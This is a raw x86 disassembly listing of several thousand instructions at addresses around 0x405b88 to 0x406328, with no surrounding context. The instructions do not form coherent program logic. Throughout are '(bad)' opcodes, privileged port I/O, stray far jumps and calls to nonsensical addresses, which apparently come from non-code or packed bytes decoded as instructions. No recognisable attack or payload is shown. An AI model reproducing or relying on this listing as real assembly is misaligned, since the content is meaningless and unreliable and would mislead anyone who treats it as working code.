  405b88:	repz aaa 
  405b8a:	jno    0x405c02
  405b8c:	jno    0x405b5f
  405b8e:	lds    esi,FWORD PTR [edi-0x28]
  405b91:	adc    bh,BYTE PTR [ecx-0x3b7c25db]
  405b97:	in     eax,dx
  405b98:	mov    DWORD PTR [bp+di+0x1ae8],eax
  405b9d:	push   0xc19fbb00
  405ba2:	mov    bl,0x13
  405ba4:	fild   WORD PTR [ebx]
  405ba6:	adc    dl,BYTE PTR [ebx]
  405ba8:	jg     0x405b60
  405baa:	jae    0x405bc3
  405bac:	retf   
  405bad:	stos   DWORD PTR es:[edi],eax
  405bae:	in     al,0x71
  405bb0:	jl     0x405b53
  405bb2:	add    al,0x5e
  405bb4:	stc    
  405bb5:	xchg   edi,eax
  405bb6:	mov    esi,0xd9b7a66f
  405bbb:	(bad)  
  405bbc:	retf   
  405bbd:	sbb    BYTE PTR [ebp+ebp*1-0x11],ah
  405bc1:	loopne 0x405b61
  405bc3:	test   BYTE PTR [edx+0x4c70d20c],dl
  405bc9:	btc    DWORD PTR [ebp-0x2ac10b4b],edx
  405bd0:	in     al,0x56
  405bd2:	ror    BYTE PTR [eax],1
  405bd4:	cmp    edi,eax
  405bd6:	popf   
  405bd7:	adc    DWORD PTR [ebx+0x4c],edi
  405bda:	mov    edi,0x1ef5f137
  405bdf:	jo     0x405c22
  405be1:	cmp    BYTE PTR [edi],dl
  405be3:	mov    bh,0xed
  405be5:	popf   
  405be6:	pop    ebx
  405be7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405be8:	xchg   DWORD PTR [ebx*4+0xc329c3a],ebp
  405bef:	fiadd  DWORD PTR [edi]
  405bf1:	add    eax,0x66de0e87
  405bf6:	pusha  
  405bf7:	fnstenv [edi+edi*2-0x681359e5]
  405bfe:	mov    edi,0xb619e20f
  405c03:	stos   DWORD PTR es:[edi],eax
  405c04:	lock loop 0x405bdf
  405c07:	addr16 cs or al,0x23
  405c0b:	ja     0x405be6
  405c0d:	dec    ebp
  405c0e:	ss (bad) 
  405c10:	push   esi
  405c11:	mov    cl,0x92
  405c13:	dec    edi
  405c14:	cmp    al,0x60
  405c16:	adc    DWORD PTR [ecx+ebx*2+0x33],0xfffffff4
  405c1b:	out    dx,al
  405c1c:	jmp    0xe7b8:0x417cba9b
  405c23:	or     dh,BYTE PTR [edi-0x8]
  405c26:	mov    bh,0x49
  405c28:	mov    edx,0xcc77d748
  405c2d:	es inc ecx
  405c2f:	gs stos DWORD PTR es:[di],eax
  405c32:	pop    ss
  405c33:	gs mov cl,0x98
  405c36:	mov    al,0xb6
  405c38:	in     eax,dx
  405c39:	pop    ebp
  405c3a:	pusha  
  405c3b:	mov    ah,0x45
  405c3d:	aam    0xa2
  405c3f:	xchg   BYTE PTR [eax-0x45],dh
  405c42:	test   eax,0x71e4d820
  405c47:	iret   
  405c48:	pop    edi
  405c49:	sbb    esp,DWORD PTR [esp+edx*1+0x20]
  405c4d:	and    ch,ah
  405c4f:	jnp    0x405c29
  405c51:	adc    BYTE PTR [edi-0x641279ac],cl
  405c57:	push   0x6d40bb05
  405c5c:	dec    edx
  405c5d:	mov    eax,ds:0xa311b913
  405c62:	xor    eax,0x5cf19241
  405c67:	or     ecx,DWORD PTR [edx+0x2b]
  405c6a:	push   edx
  405c6b:	sti    
  405c6c:	xchg   BYTE PTR [esi],dh
  405c6e:	jb     0x405c47
  405c70:	sub    ecx,esi
  405c72:	push   0xffffffc7
  405c74:	les    esp,FWORD PTR [ecx-0x7babd070]
  405c7a:	repz pusha 
  405c7c:	cmovle eax,edi
  405c7f:	psrlq  mm4,QWORD PTR [esi+0x1ac1515b]
  405c86:	sub    cl,BYTE PTR [ecx-0x6d5f5508]
  405c8c:	push   es
  405c8d:	pop    es
  405c8e:	sbb    ebx,DWORD PTR [ebx+0x1cc8459d]
  405c94:	test   DWORD PTR [ecx+0x65],ebx
  405c97:	push   esi
  405c98:	xchg   edx,eax
  405c99:	push   DWORD PTR [ebx+ebp*1]
  405c9c:	rol    al,cl
  405c9e:	mov    ah,0xec
  405ca0:	arpl   cx,bp
  405ca2:	fisttp DWORD PTR [edi]
  405ca4:	and    esi,DWORD PTR [edx+0x6]
  405ca7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ca8:	fimul  DWORD PTR [esi+ebx*1]
  405cab:	and    BYTE PTR [ebx+0x58],0xdd
  405caf:	add    BYTE PTR [edx+ecx*1-0x78],0x4e
  405cb4:	push   eax
  405cb5:	mov    DWORD PTR [esi],eax
  405cb7:	lahf   
  405cb8:	fmul   DWORD PTR [edx-0x28]
  405cbb:	push   cs
  405cbc:	push   ecx
  405cbd:	push   ecx
  405cbe:	scas   eax,DWORD PTR es:[edi]
  405cbf:	pop    es
  405cc0:	add    DWORD PTR [eax-0x11253c0e],esi
  405cc6:	lods   eax,DWORD PTR ds:[esi]
  405cc7:	mov    edi,0xb7157b3
  405ccc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ccd:	fild   WORD PTR [ebx-0x39b56fba]
  405cd3:	loop   0x405c85
  405cd5:	xor    ch,BYTE PTR [eax-0x23]
  405cd8:	je     0x405d33
  405cda:	or     DWORD PTR [edx],ebp
  405cdc:	pop    eax
  405cdd:	loop   0x405cd3
  405cdf:	fstp   QWORD PTR [edx]
  405ce1:	dec    edi
  405ce2:	sub    al,0xf5
  405ce4:	lods   al,BYTE PTR ds:[esi]
  405ce5:	das    
  405ce6:	mov    eax,ds:0x3757138
  405ceb:	xor    al,0x1d
  405ced:	scas   al,BYTE PTR es:[edi]
  405cee:	push   eax
  405cef:	int    0x60
  405cf1:	popf   
  405cf2:	cli    
  405cf3:	sbb    eax,0x197f3e11
  405cf8:	inc    ebp
  405cf9:	xchg   esi,eax
  405cfa:	or     DWORD PTR [ebx],edi
  405cfc:	sti    
  405cfd:	pusha  
  405cfe:	loop   0x405d08
  405d00:	push   edx
  405d01:	pop    ds
  405d02:	aas    
  405d03:	daa    
  405d04:	xor    esi,DWORD PTR [eax]
  405d06:	fwait
  405d07:	jle    0x405ced
  405d09:	bound  ebp,QWORD PTR [edx-0x24]
  405d0c:	push   ebp
  405d0d:	ror    DWORD PTR [bp+di-0x1f],0x95
  405d12:	xchg   ebp,eax
  405d13:	into   
  405d14:	dec    edx
  405d15:	sub    ah,al
  405d17:	mov    esi,0x1196acb2
  405d1c:	lods   eax,DWORD PTR ds:[esi]
  405d1d:	inc    eax
  405d1e:	dec    esp
  405d1f:	mov    ds:0xe83cbbdc,eax
  405d24:	rcr    BYTE PTR ds:0x70f9c88f,cl
  405d2a:	inc    esi
  405d2b:	jo     0x405d81
  405d2d:	and    BYTE PTR [esi+0xd427725],0x58
  405d34:	inc    ebp
  405d35:	jae    0x405d59
  405d37:	out    0xc2,al
  405d39:	sub    edi,DWORD PTR [ebp-0x2a]
  405d3c:	mov    ebp,0xe3919ee1
  405d41:	inc    eax
  405d42:	dec    edi
  405d43:	xchg   ebx,eax
  405d44:	cwde   
  405d45:	sbb    eax,0x294609b1
  405d4a:	retf   
  405d4b:	inc    ebp
  405d4c:	addr16 mov edx,0xefd0b7c3
  405d52:	ds repz dec edx
  405d55:	fucom  st(6)
  405d57:	xchg   ecx,eax
  405d58:	jno    0x405d16
  405d5a:	iret   
  405d5b:	icebp  
  405d5c:	inc    edi
  405d5d:	bound  ebp,QWORD PTR [edi-0x53064070]
  405d63:	ret    
  405d64:	jae    0x405dc7
  405d66:	les    edi,FWORD PTR [esi-0x12]
  405d69:	add    DWORD PTR gs:[esi+0x58],esp
  405d6d:	push   esp
  405d6e:	pop    eax
  405d6f:	aaa    
  405d70:	dec    ebx
  405d71:	ror    BYTE PTR [ecx+0x42],1
  405d74:	dec    edi
  405d75:	loop   0x405d57
  405d77:	mov    bl,dl
  405d79:	cmc    
  405d7a:	xchg   ebx,eax
  405d7b:	mov    eax,ds:0x9050d7a5
  405d80:	ins    BYTE PTR es:[edi],dx
  405d81:	sub    ch,BYTE PTR [ebx]
  405d83:	mov    ds:0x1633fbe8,eax
  405d88:	push   esp
  405d89:	repz repnz xor BYTE PTR [ecx-0x38],ch
  405d8e:	dec    esp
  405d8f:	loop   0x405dec
  405d91:	xchg   esp,eax
  405d92:	mov    ds:0x777be632,al
  405d97:	dec    ecx
  405d98:	sar    dh,1
  405d9a:	mov    edx,0x6ab66dc9
  405d9f:	cmp    al,0xc7
  405da1:	push   esp
  405da2:	mov    dh,0x7d
  405da4:	add    BYTE PTR [ebx-0x79],dl
  405da7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405da8:	ret    
  405da9:	rcl    eax,1
  405dab:	aam    0xb8
  405dad:	or     eax,0xe35ea387
  405db2:	inc    edi
  405db3:	dec    ecx
  405db4:	pop    esi
  405db5:	call   0xd99cbb41
  405dba:	dec    edi
  405dbb:	gs mov al,0x5f
  405dbe:	scas   al,BYTE PTR es:[edi]
  405dbf:	in     eax,0x41
  405dc1:	xor    dh,dl
  405dc3:	in     eax,dx
  405dc4:	data16 arpl WORD PTR [edi+0x63],ax
  405dc8:	aas    
  405dc9:	inc    esp
  405dca:	nop
  405dcb:	dec    DWORD PTR [ebp-0x4385598]
  405dd1:	sub    eax,0x41403d03
  405dd6:	enter  0x88df,0xfe
  405dda:	ret    
  405ddb:	out    dx,eax
  405ddc:	adc    BYTE PTR [ebx-0x4b3a385a],dh
  405de2:	sub    ebx,DWORD PTR [ebp-0x70]
  405de5:	push   edx
  405de6:	sub    eax,0x46134d98
  405deb:	imul   DWORD PTR [edx+0x18]
  405dee:	jge    0x405d8e
  405df0:	add    BYTE PTR [eax-0x3c],al
  405df3:	addr16 mov ah,0x17
  405df6:	leave  
  405df7:	inc    ebp
  405df8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405df9:	inc    ebx
  405dfa:	popf   
  405dfb:	push   esi
  405dfc:	jle    0x405d97
  405dfe:	(bad)  [esi+0x59e2ac71]
  405e04:	push   0xce9c2ea5
  405e09:	loopne 0x405e0b
  405e0b:	aaa    
  405e0c:	xchg   DWORD PTR [esi-0x50],edi
  405e0f:	and    dl,BYTE PTR [ebx+eiz*2-0x3c]
  405e13:	retf   
  405e14:	mov    edi,0x4094000
  405e19:	fs js  0x405e31
  405e1c:	mov    ecx,0x4bdd4651
  405e21:	(bad)  
  405e24:	pop    ebx
  405e25:	hlt    
  405e26:	dec    edi
  405e27:	mov    ebx,0x9e84217f
  405e2c:	lds    edx,FWORD PTR [esi+0x7f14c01c]
  405e32:	add    DWORD PTR [edx+0x1f],edi
  405e35:	cmovb  ebp,DWORD PTR [ebx+0x2c265bba]
  405e3c:	push   es
  405e3d:	sbb    al,0xb3
  405e3f:	popa   
  405e40:	jle    0x405e5e
  405e42:	pop    ss
  405e43:	pop    edi
  405e44:	mov    bh,0x93
  405e46:	aas    
  405e47:	dec    ecx
  405e48:	push   eax
  405e49:	sbb    eax,0x2093277f
  405e4e:	outs   dx,DWORD PTR fs:[esi]
  405e50:	mov    bl,0xb0
  405e52:	in     eax,dx
  405e53:	and    DWORD PTR [edi-0x69],edx
  405e56:	sbb    eax,0x9097c23
  405e5b:	shr    DWORD PTR [eax-0x5d],cl
  405e5e:	shr    al,1
  405e60:	pop    ecx
  405e61:	lahf   
  405e62:	jnp    0x405df4
  405e64:	lahf   
  405e65:	xchg   ecx,eax
  405e66:	cmp    DWORD PTR [ecx],ebp
  405e68:	mov    ah,0xa3
  405e6a:	mov    ds:0x44700348,eax
  405e6f:	test   al,0x10
  405e71:	xor    al,0xd6
  405e73:	xor    al,0xc6
  405e75:	cmp    esi,edi
  405e77:	dec    ebx
  405e78:	fbld   TBYTE PTR [esi+0x5]
  405e7b:	xlat   BYTE PTR ss:[ebx]
  405e7d:	or     eax,0x41770123
  405e82:	add    DWORD PTR [esi],edx
  405e84:	ret    
  405e85:	not    BYTE PTR [edi]
  405e87:	mov    al,0xc2
  405e89:	mov    eax,0x1988db6a
  405e8e:	test   eax,0x7613feb
  405e93:	es pop ecx
  405e95:	or     BYTE PTR [esi-0x18],ah
  405e98:	loop   0x405e34
  405e9a:	(bad)  
  405e9b:	nop
  405e9c:	pop    ds
  405e9d:	push   0x4d
  405e9f:	push   esp
  405ea0:	imul   BYTE PTR fs:[ebx-0x1f]
  405ea4:	jno    0x405e94
  405ea6:	push   ecx
  405ea7:	mov    al,0x75
  405ea9:	sub    al,0x6b
  405eab:	lahf   
  405eac:	rcr    bh,0xba
  405eaf:	dec    ebx
  405eb0:	call   0x4ef8:0x3daf38f6
  405eb7:	punpcklbw mm5,DWORD PTR gs:[ebx-0x70]
  405ebc:	lods   eax,DWORD PTR ds:[esi]
  405ebd:	pop    ss
  405ebe:	xchg   DWORD PTR [edx],esi
  405ec0:	and    BYTE PTR [ebx],0x85
  405ec3:	mov    ds:0xd61fc5ab,eax
  405ec8:	add    bl,ah
  405eca:	mov    bl,0x3e
  405ecc:	mov    ecx,ebp
  405ece:	mov    dl,0x1c
  405ed0:	leave  
  405ed1:	(bad)  
  405ed2:	frstor [edi+eiz*4]
  405ed5:	out    0x70,eax
  405ed7:	push   esp
  405ed8:	ja     0x405e88
  405eda:	pop    ecx
  405edb:	push   esi
  405edc:	ins    BYTE PTR es:[edi],dx
  405edd:	xor    DWORD PTR ds:0xc9a1d472,edx
  405ee3:	xchg   esi,eax
  405ee4:	(bad)  
  405ee5:	push   esp
  405ee6:	fdiv   DWORD PTR [esi-0x19]
  405ee9:	jns    0x405ee3
  405eeb:	push   0xfffffff5
  405eed:	cwde   
  405eee:	cdq    
  405eef:	(bad)  
  405ef0:	(bad)  
  405ef1:	jp     0x405f27
  405ef3:	mov    eax,ecx
  405ef5:	xchg   edi,eax
  405ef6:	and    cl,BYTE PTR [edx+ecx*4-0x6ced38cb]
  405efd:	pop    esp
  405efe:	popa   
  405eff:	jecxz  0x405e88
  405f01:	push   cs
  405f02:	retf   0x41e3
  405f05:	jb     0x405f55
  405f07:	not    DWORD PTR [eax*2+0x556b6271]
  405f0e:	outs   dx,BYTE PTR ds:[esi]
  405f0f:	lods   al,BYTE PTR ds:[esi]
  405f10:	das    
  405f11:	das    
  405f12:	mov    ds:0x41bfd6e7,eax
  405f17:	adc    eax,DWORD PTR [ecx-0x17cbcb48]
  405f1d:	push   esi
  405f1e:	jmp    0x48beaf02
  405f23:	das    
  405f24:	xlat   BYTE PTR ds:[ebx]
  405f25:	in     eax,dx
  405f26:	push   edx
  405f27:	push   ebp
  405f28:	pusha  
  405f29:	mov    DWORD PTR [ebx-0x7],ecx
  405f2c:	or     BYTE PTR [ebp-0x62e4912a],ah
  405f32:	in     al,dx
  405f33:	gs and al,0x99
  405f36:	dec    BYTE PTR [ecx]
  405f38:	jl     0x405efa
  405f3a:	ja     0x405f11
  405f3c:	jmp    0x572b88d1
  405f41:	(bad)  
  405f42:	mov    ch,0x8a
  405f44:	inc    edi
  405f45:	pop    edx
  405f46:	fiadd  WORD PTR [eax]
  405f48:	jne    0x405f96
  405f4a:	inc    edi
  405f4b:	adc    al,dh
  405f4d:	cmp    BYTE PTR [ecx+0x3e],ah
  405f50:	mov    al,ds:0x246c74ca
  405f55:	or     DWORD PTR [ebp+0x12cd5931],eax
  405f5b:	mov    cl,0xb4
  405f5d:	jge    0x405fc2
  405f5f:	dec    esp
  405f60:	sbb    esp,DWORD PTR [ecx+0x48cd02d6]
  405f66:	sub    al,0xf2
  405f68:	mov    ds:0xd0de4463,al
  405f6d:	in     eax,0xa2
  405f6f:	adc    DWORD PTR [ebx+0x1c8d73cd],esi
  405f75:	adc    al,0x43
  405f77:	rcl    eax,0x2a
  405f7a:	and    edi,DWORD PTR [eax-0x7c]
  405f7d:	pop    ebp
  405f7e:	lock push esi
  405f80:	das    
  405f81:	pop    esi
  405f82:	jmp    0x405fad
  405f84:	stos   DWORD PTR es:[edi],eax
  405f85:	xlat   BYTE PTR ds:[ebx]
  405f86:	sar    ebp,cl
  405f88:	mov    ebp,0x56be111e
  405f8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f8e:	mov    edi,0x403a7b8c
  405f93:	lods   eax,DWORD PTR ds:[esi]
  405f94:	psubusw mm6,QWORD PTR gs:[ebp+0x2926544b]
  405f9c:	(bad)  
  405f9d:	(bad)  
  405f9f:	das    
  405fa0:	or     ah,dl
  405fa2:	arpl   si,sp
  405fa4:	popa   
  405fa5:	jle    0x405f2e
  405fa7:	mov    edx,DWORD PTR ds:0x361c318e
  405fad:	fnsave [eax-0x75]
  405fb0:	fs inc ebx
  405fb2:	(bad)  
  405fb4:	mov    dh,0x0
  405fb6:	xor    al,0xaf
  405fb8:	in     al,dx
  405fb9:	adc    eax,0xc31bc7ff
  405fbe:	fdiv   DWORD PTR [ebx+0x3e]
  405fc1:	pushf  
  405fc2:	sbb    dl,BYTE PTR [ecx]
  405fc4:	add    DWORD PTR [ebp-0x67],ebp
  405fc7:	xor    DWORD PTR [ecx+esi*8],0xa648c33e
  405fce:	mov    dl,0xa4
  405fd0:	mov    esp,0xd4971643
  405fd5:	das    
  405fd6:	shr    eax,1
  405fd8:	jmp    0xf7aba050
  405fdd:	fsub   st(4),st
  405fdf:	test   DWORD PTR [edi-0x1cd9e05b],edi
  405fe5:	aaa    
  405fe6:	sub    DWORD PTR [ebx-0x2f],edx
  405fe9:	push   0xffffffbd
  405feb:	stos   BYTE PTR es:[edi],al
  405fec:	and    ebx,ebx
  405fee:	xor    DWORD PTR [edx-0x55950320],edx
  405ff4:	jae    0x405fa0
  405ff6:	fsubr  QWORD PTR [eax-0x5ac7e6e0]
  405ffc:	fdivr  st,st(6)
  405ffe:	jae    0x405fba
  406000:	inc    ebx
  406001:	push   es
  406002:	mov    bl,0x72
  406004:	jg     0x405f9e
  406006:	repnz add cl,dl
  406009:	cs push esi
  40600b:	imul   eax,DWORD PTR [edx+0x5],0xffffffe1
  40600f:	inc    edx
  406010:	outs   dx,BYTE PTR ds:[esi]
  406011:	(bad)  
  406012:	jb     0x406023
  406014:	test   BYTE PTR [ecx+edx*2+0x6a],bl
  406018:	cmp    eax,0xe4a54ee1
  40601d:	mov    eax,ds:0x4a451706
  406022:	rol    esp,cl
  406024:	mov    ds:0x2e4cf61d,eax
  406029:	sub    al,0x1e
  40602b:	jl     0x406064
  40602d:	aaa    
  40602e:	cmp    BYTE PTR [esi],bl
  406030:	adc    ecx,esi
  406032:	jle    0x406051
  406034:	retf   0xcd45
  406037:	mov    es,WORD PTR [ecx-0x22717ef2]
  40603d:	inc    edx
  40603e:	fmul   QWORD PTR [esi+0x7c]
  406041:	mov    al,ds:0xe52bdd18
  406046:	ins    DWORD PTR es:[edi],dx
  406047:	leave  
  406048:	mov    eax,ds:0x8c787484
  40604d:	mov    ds:0x13fd9e71,al
  406052:	xchg   esi,eax
  406053:	sbb    ch,BYTE PTR [eax+ebx*2+0x5c284440]
  40605a:	add    al,0xd7
  40605c:	rcl    DWORD PTR [ebx],0x31
  40605f:	loopne 0x4060c9
  406061:	ror    BYTE PTR [ebx+0x62],1
  406064:	not    DWORD PTR [esi-0x183bc084]
  40606a:	sub    ebx,esp
  40606c:	xchg   ebp,eax
  40606d:	(bad)  
  40606e:	comiss xmm6,DWORD PTR [edi-0xe1ea087]
  406075:	(bad)
  406079:	and    al,0x82
  40607b:	retf   0x4c3e
  40607e:	ficom  WORD PTR [ecx-0x647cb544]
  406084:	fwait
  406085:	mov    dh,0x47
  406087:	jle    0x406069
  406089:	inc    ecx
  40608a:	mov    ch,0x8c
  40608c:	outs   dx,BYTE PTR ds:[esi]
  40608d:	push   cs
  40608e:	(bad)  
  40608f:	pushf  
  406090:	push   cs
  406091:	not    ah
  406093:	jl     0x406086
  406095:	stc    
  406096:	sar    BYTE PTR [ebx+edi*2+0xa],0xd4
  40609b:	lock dec esi
  40609d:	imul   edx,esp,0x1
  4060a0:	cmp    eax,0x807a9b23
  4060a5:	aas    
  4060a6:	adc    DWORD PTR [eax],0xbfa1dca6
  4060ac:	dec    ebp
  4060ad:	inc    esi
  4060ae:	push   ds
  4060af:	(bad)
  4060b2:	leave  
  4060b3:	jbe    0x406128
  4060b5:	and    al,BYTE PTR [ebx+0x6a]
  4060b8:	int3   
  4060b9:	test   BYTE PTR [ecx+ecx*8-0x576479b0],bl
  4060c0:	jae    0x40613c
  4060c2:	mov    edx,0x26ffdaed
  4060c7:	dec    BYTE PTR ds:0x63584c49
  4060cd:	scas   eax,DWORD PTR es:[di]
  4060cf:	push   edi
  4060d0:	mov    BYTE PTR [edx-0x1ec6af9],ch
  4060d6:	jno    0x406108
  4060d8:	jmp    0xb700:0x268deb8a
  4060df:	sub    BYTE PTR [esi+eax*1],ch
  4060e2:	cmc    
  4060e3:	inc    ebp
  4060e4:	cld    
  4060e5:	adc    eax,0xa627d129
  4060ea:	mov    edi,0x1f8c1336
  4060ef:	int3   
  4060f0:	dec    ebp
  4060f1:	sbb    al,BYTE PTR [edi]
  4060f3:	pop    esp
  4060f4:	cmp    BYTE PTR [eax],cl
  4060f6:	and    bh,bh
  4060f8:	or     DWORD PTR [ecx],ebx
  4060fa:	fwait
  4060fb:	adc    al,0x0
  4060fd:	lods   al,BYTE PTR ds:[esi]
  4060fe:	and    DWORD PTR ds:0x46c42188,0xfffffffb
  406105:	stos   BYTE PTR es:[edi],al
  406106:	aaa    
  406107:	nop
  406108:	jge    0x406174
  40610a:	int3   
  40610b:	cmp    edx,DWORD PTR [ebx-0x7c]
  40610e:	mov    fs,WORD PTR [ebp+ebp*4+0x19]
  406112:	imul   BYTE PTR [eax+ecx*8+0x15]
  406116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406117:	mov    ds:0x6b95e771,al
  40611c:	stos   DWORD PTR es:[edi],eax
  40611d:	adc    al,al
  40611f:	pop    es
  406120:	mov    gs,WORD PTR [esi+0xcb77f29]
  406126:	mov    dh,0x21
  406129:	lea    eax,[eiz*1+0x7ba00a05]
  406130:	les    ebx,FWORD PTR [ebx]
  406132:	lds    edx,FWORD PTR [edx]
  406134:	icebp  
  406135:	and    DWORD PTR [ecx],ecx
  406137:	cmp    dh,BYTE PTR [edx-0x28ec2557]
  40613d:	(bad)  
  40613e:	push   ss
  40613f:	add    dh,BYTE PTR [edx-0x6f19bfac]
  406145:	mov    edx,ebx
  406147:	lods   eax,DWORD PTR ds:[esi]
  406148:	adc    al,0xfc
  40614a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40614b:	pop    ds
  40614c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40614d:	dec    esi
  40614e:	adc    al,0xa
  406150:	scas   eax,DWORD PTR es:[edi]
  406151:	mul    DWORD PTR [ebp+0x2f]
  406154:	mov    ecx,0x38b82507
  406159:	stos   BYTE PTR es:[edi],al
  40615a:	cdq    
  40615b:	mov    ds:0xdbfe970c,al
  406160:	ss call 0x3dbf521b
  406166:	push   0xffffffe9
  406168:	push   ds
  406169:	aam    0x5b
  40616b:	lods   eax,DWORD PTR ds:[esi]
  40616c:	fsub   DWORD PTR [esi+0x22]
  40616f:	ins    BYTE PTR es:[edi],dx
  406170:	and    dl,BYTE PTR [edx]
  406172:	jb     0x406154
  406174:	xchg   edi,edx
  406176:	xchg   edi,eax
  406177:	or     eax,0xeaa54068
  40617c:	add    dh,0x79
  40617f:	repz aaa 
  406181:	out    dx,eax
  406182:	xchg   ebp,eax
  406183:	call   FWORD PTR [ebp-0xf]
  406186:	nop
  406187:	xor    al,0x24
  406189:	fcomp  QWORD PTR [edi+0x36771ebb]
  40618f:	jle    0x40612c
  406191:	dec    ebx
  406192:	jg     0x4061a6
  406194:	fsub   QWORD PTR [ecx]
  406196:	mov    ?,WORD PTR [eax+0x72]
  406199:	jmp    0xf711c3a2
  40619e:	sub    DWORD PTR [ebp-0x428e96f7],edi
  4061a4:	int    0x47
  4061a6:	sbb    esp,DWORD PTR [esi-0x14]
  4061a9:	dec    edx
  4061aa:	into   
  4061ab:	in     eax,0xa0
  4061ad:	push   ebx
  4061ae:	loop   0x4061d5
  4061b0:	imul   ebx,DWORD PTR [edx+0x37],0x4e
  4061b4:	ds in  al,dx
  4061b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061b7:	cs inc ecx
  4061b9:	mov    dl,0x8d
  4061bb:	pop    edx
  4061bc:	inc    ebx
  4061bd:	(bad)  
  4061be:	mov    cl,0x5d
  4061c0:	out    0xe2,eax
  4061c2:	in     al,0x57
  4061c4:	(bad)  
  4061c5:	scas   al,BYTE PTR es:[edi]
  4061c6:	sbb    BYTE PTR [esi+0x12b83937],cl
  4061cc:	or     ch,BYTE PTR [esi-0xb9c3f06]
  4061d2:	in     al,0x2e
  4061d4:	into   
  4061d5:	cmp    al,ah
  4061d7:	fadd   QWORD PTR [eax]
  4061d9:	lahf   
  4061da:	ds pushf 
  4061dc:	mov    cl,0x3c
  4061de:	xor    DWORD PTR [ecx-0x40],esi
  4061e1:	cld    
  4061e2:	sub    cl,BYTE PTR [edx+0x5de48c86]
  4061e8:	cdq    
  4061e9:	call   0x880b1b9b
  4061ee:	out    0x4,al
  4061f0:	arpl   WORD PTR [edi],dx
  4061f2:	adc    bl,BYTE PTR [edi+0x32]
  4061f5:	mov    edi,0xaaabbf3a
  4061fa:	add    eax,0x5f98fc31
  4061ff:	sub    BYTE PTR [ecx+0x2fde8373],dl
  406205:	mov    edx,0x7555bb50
  40620a:	or     bl,dh
  40620c:	lock and BYTE PTR [eax-0x66dc83a9],dl
  406213:	jnp    0x4061d5
  406215:	ins    BYTE PTR es:[edi],dx
  406216:	loop   0x406281
  406218:	xor    BYTE PTR [edi+0xcd7593d],bh
  40621e:	sbb    ebp,DWORD PTR [ebx]
  406220:	inc    edi
  406221:	shl    BYTE PTR [edi+ebx*2],1
  406224:	outs   dx,DWORD PTR ds:[esi]
  406225:	mov    eax,ds:0x52b12b2b
  40622a:	stc    
  40622b:	jo     0x406234
  40622d:	mov    al,0x62
  40622f:	lods   al,BYTE PTR ds:[esi]
  406230:	pop    ecx
  406231:	lahf   
  406232:	add    edx,ecx
  406234:	icebp  
  406235:	xor    DWORD PTR [ecx+edx*8-0x2e9d85e1],0xffffff89
  40623d:	xor    BYTE PTR [esp+eiz*2-0x729c4c7f],ah
  406244:	push   ecx
  406245:	pop    edx
  406246:	sub    eax,0x59d11264
  40624b:	mov    edi,0x76abfd66
  406250:	das    
  406251:	mov    ebx,0x970c4a11
  406256:	jle    0x406297
  406258:	pusha  
  406259:	mov    esi,0x784ae387
  40625e:	rcl    DWORD PTR [edx+0x22],cl
  406261:	mov    BYTE PTR [esi+0x3f8b128c],al
  406267:	push   ds
  406268:	les    ebp,FWORD PTR [edi]
  40626a:	sbb    eax,0x63dd2022
  40626f:	outs   dx,DWORD PTR ds:[esi]
  406270:	rcr    BYTE PTR [ebx+0x7d123a9e],1
  406276:	ss aaa 
  406278:	inc    esi
  406279:	outs   dx,DWORD PTR ds:[esi]
  40627a:	and    DWORD PTR ds:0x53e5e7e7,edi
  406280:	enter  0x585a,0x52
  406284:	mov    DWORD PTR [ecx],eax
  406286:	repz xchg esp,eax
  406288:	push   eax
  406289:	add    DWORD PTR [ecx],eax
  40628b:	xchg   DWORD PTR [esi-0x5db22e5d],esp
  406291:	aam    0x2f
  406293:	or     DWORD PTR [ecx],edi
  406295:	ja     0x406221
  406297:	cmc    
  406298:	mov    edi,0xf858e3c3
  40629d:	sub    ecx,DWORD PTR [esi+0x135f420]
  4062a3:	das    
  4062a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062a5:	push   ebx
  4062a6:	mov    ebp,0xcdb2ecab
  4062ab:	adc    al,0x59
  4062ad:	and    ebx,DWORD PTR [edi]
  4062af:	cli    
  4062b0:	out    dx,eax
  4062b1:	loop   0x4062d7
  4062b3:	and    al,0xa1
  4062b5:	inc    edx
  4062b6:	mov    esp,0xbc681f9
  4062bb:	mov    al,ds:0x1f016d33
  4062c0:	in     eax,dx
  4062c1:	dec    edx
  4062c2:	in     al,dx
  4062c3:	add    ah,BYTE PTR [esi+0x10]
  4062c6:	aas    
  4062c7:	sub    edi,esp
  4062c9:	ins    BYTE PTR es:[edi],dx
  4062ca:	mov    esp,0x3c0d6ae9
  4062cf:	es fnsetpm(287 only) 
  4062d2:	xor    eax,0xdb405d98
  4062d7:	xchg   DWORD PTR [ebp-0x73],edx
  4062da:	es dec edx
  4062dc:	mov    ebx,0x9cad244e
  4062e1:	call   0xc2a2:0x3db01e63
  4062e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062e9:	pop    ebx
  4062ea:	and    DWORD PTR [esi+0xf],esi
  4062ed:	lods   al,BYTE PTR ds:[esi]
  4062ee:	into   
  4062ef:	fbld   TBYTE PTR [ecx]
  4062f1:	loopne 0x4062b6
  4062f3:	jmp    0x4062c3
  4062f5:	mov    esi,0x3070dd55
  4062fa:	mov    eax,0x16267f79
  4062ff:	mov    ebx,0x68d16b6b
  406304:	out    dx,eax
  406305:	ins    DWORD PTR es:[edi],dx
  406306:	stos   BYTE PTR es:[edi],al
  406307:	adc    dh,BYTE PTR [ecx]
  406309:	cli    
  40630a:	or     ch,dh
  40630c:	cwde   
  40630d:	mov    bl,0x53
  40630f:	std    
  406310:	stc    
  406311:	popw   es
  406313:	xchg   ebp,eax
  406314:	sbb    bh,bl
  406316:	and    BYTE PTR [ebp-0x40],dl
  406319:	mov    edi,0x9b5b3f56
  40631e:	popa   
  40631f:	retf   
  406320:	lock sbb al,0xe8
  406323:	pushf  
  406324:	int3   
  406325:	das    
  406326:	push   ds
  406327:	outs   dx,BYTE PTR ds:[esi]
  406328:	mov    dl,0xf0
